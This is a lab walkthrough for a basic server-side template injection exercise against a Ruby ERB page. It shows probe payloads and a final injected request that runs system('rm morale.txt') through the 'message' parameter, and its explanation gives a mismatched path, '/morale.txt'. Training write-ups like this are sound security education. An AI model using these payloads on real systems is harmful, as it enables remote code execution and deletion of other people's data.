## Basic server-side template injection

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

## Notes

- /message


## Resume

1. Identify reflected input
2. Test template syntax
3. Confirm server-side expression evaluation
4. Identify the template engine as ERB
5. Execute operating system commands
6. Delete file

## Solve

When attempting to access an unavailable product, the application redirects to the homepage with a reflected `message` parameter:

```http
GET /?message=Unfortunately+this+product+is+out+of+stock
```

The reflected content appears dynamically rendered inside the page.

To identify whether a template engine is used, test common SSTI payloads for multiple languages and frameworks.

Basic payload testing:

```text
${7*7}
```

```text
{{7*7}}
```

```text
<%= 7 * 7 %>
```

The payload:

```erb
<%= 7 * 7 %>
```

returns:

```text
49
```

This confirms that the input is being evaluated server-side.

The syntax:

```erb
<%= expression %>
```

is specific to the Ruby ERB template engine.

The vulnerable parameter is:

```text
message
```

Proof of concept payload:

```erb
<%= 7 * 7 %>
```

URL-encoded payload:

```text
<%25%3d+7*7+%25>
```

Injected request:

```http
GET /?message=<%25%3d+7*7+%25>
```

The server evaluates:

```ruby
7 * 7
```

and renders:

```text
49
```

directly inside the response.

Since arbitrary Ruby expressions can be evaluated, operating system commands can also be executed using:

```ruby
system()
```

The lab requires deleting file:

```text
morale.txt
```

Malicious payload:

```erb
<%= system('rm morale.txt') %>
```

URL-encoded payload:

```text
<%25%3d+system('rm+morale.txt')+%25>
```

Final exploit request:

```http
GET /?message=<%25%3d+system('rm+morale.txt')+%25>
```

The ERB engine evaluates:

```ruby
system('rm /morale.txt')
```

which executes the operating system command:

```bash
rm /morale.txt
```

As a result, file is deleted and the lab is solved.

Proof of concept:

```erb
<%= 7 * 7 %>
```

Result:

```text
49
```

Final payload:

```erb
<%= system('rm morale.txt') %>
```

Encoded exploit:

```text
<%25%3d+system('rm+morale.txt')+%25>